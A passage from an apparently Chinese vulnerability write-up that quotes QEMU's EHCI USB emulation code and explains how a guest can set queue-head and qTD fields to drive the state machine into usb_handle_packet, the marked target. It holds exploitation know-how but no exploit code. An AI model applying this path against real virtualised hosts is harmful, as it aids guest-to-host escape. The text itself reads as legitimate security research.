EST_ADVANCEQUEUE:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_advqueue(q);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHQTD:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_fetchqtd(q);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_HORIZONTALQH:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_horizqh(q);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_EXECUTE:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_execute(q);<br>            <span class="hljs-keyword">if</span> (async)<br>            &#123;<br>                ehci-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_EXECUTING:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (async)<br>            &#123;<br>                ehci-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            &#125;<br>            again = ehci_state_executing(q);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_WRITEBACK:<br>            assert(q != <span class="hljs-literal">NULL</span>);<br>            again = ehci_state_writeback(q);<br>            <span class="hljs-keyword">if</span> (!async)<br>            &#123;<br>                ehci-&gt;periodic_sched_active = PERIODIC_ACTIVE;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Bad state!\n&quot;</span>);<br>            again = <span class="hljs-number">-1</span>;<br>            g_assert_not_reached();<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (again &lt; <span class="hljs-number">0</span> || itd_count &gt; <span class="hljs-number">16</span>)<br>        &#123;<br>            <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> notify guest (raise HSE irq?) */</span><br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;processing error - resetting ehci HC\n&quot;</span>);<br>            ehci_reset(ehci);<br>            again = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (again);<br>&#125;<br><br><span class="hljs-comment">/*  This state is the entry point for periodic schedule processing as</span><br><span class="hljs-comment"> *  well as being a continuation state for async processing.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_fetchentry</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> entry = ehci_get_fetch_addr(ehci, async);<br><br>    <span class="hljs-keyword">if</span> (NLPTR_TBIT(entry))<br>    &#123;<br>        ehci_set_state(ehci, async, EST_ACTIVE);<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* section 4.8, only QH in async schedule */</span><br>    <span class="hljs-keyword">if</span> (async &amp;&amp; (NLPTR_TYPE_GET(entry) != NLPTR_TYPE_QH))<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;non queue head request in async schedule\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (NLPTR_TYPE_GET(entry))<br>    &#123;<br>    <span class="hljs-keyword">case</span> NLPTR_TYPE_QH:<br>        ehci_set_state(ehci, async, EST_FETCHQH);<br>        again = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> NLPTR_TYPE_ITD:<br>        ehci_set_state(ehci, async, EST_FETCHITD);<br>        again = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> NLPTR_TYPE_STITD:<br>        ehci_set_state(ehci, async, EST_FETCHSITD);<br>        again = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> handle FSTN type */</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;FETCHENTRY: entry at %X is of type %d &quot;</span><br>                        <span class="hljs-string">&quot;which is not supported yet\n&quot;</span>,<br>                entry, NLPTR_TYPE_GET(entry));<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">return</span> again;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NLPTR_TYPE_GET(x) (((x) &gt;&gt; 1) &amp; 3)</span><br></code></pre></td></tr></table></figure>

<p>这个函数实现了一个状态机，可以完成不同状态之间的转换。通过调试，发现函数总是会优先进入到<code>EST_FETCHENTRY</code> 这个分支，然后会调用<code>ehci_state_fetchentry</code> 这个函数。</p>
<p>这个函数会调用<code>ehci_get_fetch_addr</code> 函数获取<code>ehci-&gt;p_fetch_addr</code> 作为<code>entry</code>。这里我们的目的是进入到<code>NLPTR_TYPE_QH</code> 这个分支中，所以需要设置<code>entry &gt;&gt; 1 &amp; 3 == NLPTR_TYPE_QH</code> 。也即需要设置<code>*ehci-&gt;periodiclistbase == target_addr + 2</code>。</p>
<p>之后回到<code>ehci_advance_state</code> 函数中，并进入到<code>EST_FETCHQH</code> 状态中，调用<code>ehci_state_fetchqh</code> 函数。</p>
<p><code>ehci_state_fetchqh</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> EHCIQueue *<span class="hljs-title function_">ehci_state_fetchqh</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> entry;<br>    EHCIQueue *q;<br>    EHCIqh qh;<br><br>    entry = ehci_get_fetch_addr(ehci, async);<br>    q = ehci_find_queue_by_qh(ehci, entry, async);<br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        q = ehci_alloc_queue(ehci, entry, async);<br>    &#125;<br><br>    q-&gt;seen++;<br>    <span class="hljs-keyword">if</span> (q-&gt;seen &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-comment">/* we are going in circles -- stop processing */</span><br>        ehci_set_state(ehci, async, EST_ACTIVE);<br>        q = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr),<br>                   (<span class="hljs-type">uint32_t</span> *)&amp;qh, <span class="hljs-keyword">sizeof</span>(EHCIqh) &gt;&gt; <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        q = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>    ehci_trace_qh(q, NLPTR_GET(q-&gt;qhaddr), &amp;qh);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The overlay area of the qh should never be changed by the guest,</span><br><span class="hljs-comment">     * except when idle, in which case the reset is a nop.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (!ehci_verify_qh(q, &amp;qh))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ehci_reset_queue(q) &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            ehci_trace_guest_bug(ehci, <span class="hljs-string">&quot;guest updated active QH&quot;</span>);<br>        &#125;<br>    &#125;<br>    q-&gt;qh = qh;<br><br>    q-&gt;transact_ctr = get_field(q-&gt;qh.epcap, QH_EPCAP_MULT);<br>    <span class="hljs-keyword">if</span> (q-&gt;transact_ctr == <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">/* Guest bug in some versions of windows */</span><br>        q-&gt;transact_ctr = <span class="hljs-number">4</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (q-&gt;dev == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        q-&gt;dev = ehci_find_device(q-&gt;ehci,<br>                                  get_field(q-&gt;qh.epchar, QH_EPCHAR_DEVADDR));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (async &amp;&amp; (q-&gt;qh.epchar &amp; QH_EPCHAR_H))<br>    &#123;<br><br>        <span class="hljs-comment">/*  EHCI spec version 1.0 Section 4.8.3 &amp; 4.10.1 */</span><br>        <span class="hljs-keyword">if</span> (ehci-&gt;usbsts &amp; USBSTS_REC)<br>        &#123;<br>            ehci_clear_usbsts(ehci, USBSTS_REC);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            DPRINTF(<span class="hljs-string">&quot;FETCHQH:  QH 0x%08x. H-bit set, reclamation status reset&quot;</span><br>                    <span class="hljs-string">&quot; - done processing\n&quot;</span>,<br>                    q-&gt;qhaddr);<br>            ehci_set_state(ehci, async, EST_ACTIVE);<br>            q = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> EHCI_DEBUG</span><br>    <span class="hljs-keyword">if</span> (q-&gt;qhaddr != q-&gt;qh.next)<br>    &#123;<br>        DPRINTF(<span class="hljs-string">&quot;FETCHQH:  QH 0x%08x (h %x halt %x active %x) next 0x%08x\n&quot;</span>,<br>                q-&gt;qhaddr,<br>                q-&gt;qh.epchar &amp; QH_EPCHAR_H,<br>                q-&gt;qh.token &amp; QTD_TOKEN_HALT,<br>                q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE,<br>                q-&gt;qh.next);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (q-&gt;qh.token &amp; QTD_TOKEN_HALT)<br>    &#123;<br>        ehci_set_state(ehci, async, EST_HORIZONTALQH);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE) &amp;&amp;	<span class="hljs-comment">// [1]</span><br>             (NLPTR_TBIT(q-&gt;qh.current_qtd) == <span class="hljs-number">0</span>) &amp;&amp;<br>             (q-&gt;qh.current_qtd != <span class="hljs-number">0</span>))<br>    &#123;<br>        q-&gt;qtdaddr = q-&gt;qh.current_qtd;<br>        ehci_set_state(ehci, async, EST_FETCHQTD);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">/*  EHCI spec version 1.0 Section 4.10.2 */</span><br>        ehci_set_state(ehci, async, EST_ADVANCEQUEUE);<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">return</span> q;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个函数首先调用<code>ehci_get_fetch_addr</code> 函数获取<code>ehci-&gt;p_fetch_addr</code> 作为<code>entry</code>，然后分配一个<code>EHCIQueue</code> 结构体，接着一个关键部分如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr),<br>                   (<span class="hljs-type">uint32_t</span> *)&amp;qh, <span class="hljs-keyword">sizeof</span>(EHCIqh) &gt;&gt; <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>

<p>通过<code>get_dwords</code> 函数获取<code>q-qhaddr</code> 地址的内容为<code>EHCIqh</code>结构体<code>qh</code> 赋值，而<code>q-&gt;qhaddr</code> 也即上文中的<code>entry</code> ，所以这个结构体<code>qh</code> 是我们可控的。然后设置<code>q-&gt;qh.token</code> 的值，使程序运行到<code>[1]</code> 处，设置<code>q-&gt;qtdaddr = q-&gt;qh.current_qtd</code> 以及状态机的状态。最终返回到<code>ehci_advance_state</code>，并进入到<code>EST_FETCHQTD</code> 这个状态中。</p>
<p><code>ehci_state_fetchqtd</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Section 4.10.2 - paragraph 4 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_fetchqtd</span><span class="hljs-params">(EHCIQueue *q)</span><br>&#123;<br>    EHCIqtd qtd;<br>    EHCIPacket *p;<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> addr;<br><br>    addr = NLPTR_GET(q-&gt;qtdaddr);<br>    <span class="hljs-keyword">if</span> (get_dwords(q-&gt;ehci, addr + <span class="hljs-number">8</span>, &amp;qtd.token, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    barrier();<br>    <span class="hljs-keyword">if</span> (get_dwords(q-&gt;ehci, addr + <span class="hljs-number">0</span>, &amp;qtd.next, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span> ||<br>        get_dwords(q-&gt;ehci, addr + <span class="hljs-number">4</span>, &amp;qtd.altnext, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span> ||<br>        get_dwords(q-&gt;ehci, addr + <span class="hljs-number">12</span>, qtd.bufptr,<br>                   ARRAY_SIZE(qtd.bufptr)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    ehci_trace_qtd(q, NLPTR_GET(q-&gt;qtdaddr), &amp;qtd);<br><br>    p = QTAILQ_FIRST(&amp;q-&gt;packets);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!ehci_verify_qtd(p, &amp;qtd))<br>        &#123;<br>            ehci_cancel_queue(q);<br>            <span class="hljs-keyword">if</span> (qtd.token &amp; QTD_TOKEN_ACTIVE)<br>            &#123;<br>                ehci_trace_guest_bug(q-&gt;ehci, <span class="hljs-string">&quot;guest updated active qTD&quot;</span>);<br>            &#125;<br>            p = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            p-&gt;qtd = qtd;<br>            ehci_qh_do_overlay(q);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(qtd.token &amp; QTD_TOKEN_ACTIVE))<br>    &#123;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (p-&gt;async)<br>        &#123;<br>        <span class="hljs-keyword">case</span> EHCI_ASYNC_NONE:<br>        <span class="hljs-keyword">case</span> EHCI_ASYNC_INITIALIZED:<br>            <span class="hljs-comment">/* Not yet executed (MULT), or previously nacked (int) packet */</span><br>            ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EHCI_ASYNC_INFLIGHT:<br>            <span class="hljs-comment">/* Check if the guest has added new tds to the queue */</span><br>            again = ehci_fill_queue(QTAILQ_LAST(&amp;q-&gt;packets));<br>            <span class="hljs-comment">/* Unfinished async handled packet, go horizontal */</span><br>            ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EHCI_ASYNC_FINISHED:<br>            <span class="hljs-comment">/* Complete executing of the packet */</span><br>            ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTING);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>	<span class="hljs-comment">// [1]</span><br>    &#123;<br>        p = ehci_alloc_packet(q);<br>        p-&gt;qtdaddr = q-&gt;qtdaddr;<br>        p-&gt;qtd = qtd;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> again;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由上述分析可知，<code>q-&gt;qtdaddr</code> 字段是可控的，只需要满足<code>qtd.token &amp; QTD_TOKEN_ACTIVE != 0</code> 即可执行到目标地址。设置状态机状态为<code>EST_EXECUTE</code> ，返回到<code>ehci_advance_state</code> 函数中，最终执行到<code>ehci_state_execute</code> 函数中。</p>
<p><code>ehci_state_execute</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_execute</span><span class="hljs-params">(EHCIQueue *q)</span><br>&#123;<br>    EHCIPacket *p = QTAILQ_FIRST(&amp;q-&gt;packets);<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">0</span>;<br><br>    assert(p != <span class="hljs-literal">NULL</span>);<br>    assert(p-&gt;qtdaddr == q-&gt;qtdaddr);<br><br>    <span class="hljs-keyword">if</span> (ehci_qh_do_overlay(q) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// TODO verify enough time remains in the uframe as in 4.4.1.1</span><br>    <span class="hljs-comment">// TODO write back ptr to async list when done or out of time</span><br><br>    <span class="hljs-comment">/* 4.10.3, bottom of page 82, go horizontal on transaction counter == 0 */</span><br>    <span class="hljs-keyword">if</span> (!q-&gt;async &amp;&amp; q-&gt;transact_ctr == <span class="hljs-number">0</span>)<br>    &#123;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>        again = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (q-&gt;async)<br>    &#123;<br>        ehci_set_usbsts(q-&gt;ehci, USBSTS_REC);<br>    &#125;<br><br>    again = ehci_execute(p, <span class="hljs-string">&quot;process&quot;</span>);	<span class="hljs-comment">// [1]</span><br>    <span class="hljs-keyword">if</span> (again == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;packet.status == USB_RET_ASYNC)<br>    &#123;<br>        ehci_flush_qh(q);<br>        trace_usb_ehci_packet_action(p-&gt;<span class="hljs-built_in">queue</span>, p, <span class="hljs-string">&quot;async&quot;</span>);<br>        p-&gt;async = EHCI_ASYNC_INFLIGHT;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>        <span class="hljs-keyword">if</span> (q-&gt;async)<br>        &#123;<br>            again = ehci_fill_queue(p);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            again = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTING);<br>    again = <span class="hljs-number">1</span>;<br><br>out:<br>    <span class="hljs-keyword">return</span> again;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里没做什么判断就直接调用<code>ehci_execute</code> 函数。</p>
<p><code>ehci_execute</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_execute</span><span class="hljs-params">(EHCIPacket *p, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *action)</span><br>&#123;<br>    USBEndpoint *ep;<br>    <span class="hljs-type">int</span> endp;<br>    <span class="hljs-type">bool</span> spd;<br><br>    assert(p-&gt;async == EHCI_ASYNC_NONE ||<br>           p-&gt;async == EHCI_ASYNC_INITIALIZED);<br><br>    <span class="hljs-keyword">if</span> (!(p-&gt;qtd.token &amp; QTD_TOKEN_ACTIVE))<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Attempting to execute inactive qtd\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES) &gt; BUFF_SIZE)<br>    &#123;<br>        ehci_trace_guest_bug(p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci,<br>                             <span class="hljs-string">&quot;guest requested more bytes than allowed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!ehci_verify_pid(p-&gt;<span class="hljs-built_in">queue</span>, &amp;p-&gt;qtd))<br>    &#123;<br>        ehci_queue_stopped(p-&gt;<span class="hljs-built_in">queue</span>); <span class="hljs-comment">/* Mark the ep in the prev dir stopped */</span><br>    &#125;<br>    p-&gt;pid = ehci_get_pid(&amp;p-&gt;qtd);<br>    p-&gt;<span class="hljs-built_in">queue</span>-&gt;last_pid = p-&gt;pid;<br>    endp = get_field(p-&gt;<span class="hljs-built_in">queue</span>-&gt;qh.epchar, QH_EPCHAR_EP);<br>    ep = usb_ep_get(p-&gt;<span class="hljs-built_in">queue</span>-&gt;dev, p-&gt;pid, endp);<br><br>    <span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE)	<span class="hljs-comment">// [1]</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br><br>    trace_usb_ehci_packet_action(p-&gt;<span class="hljs-built_in">queue</span>, p, action);<br>    usb_handle_packet(p-&gt;<span class="hljs-built_in">queue</span>-&gt;dev, &amp;p-&gt;packet);	<span class="hljs-comment">// target</span><br>    DPRINTF(<span class="hljs-string">&quot;submit: qh 0x%x next 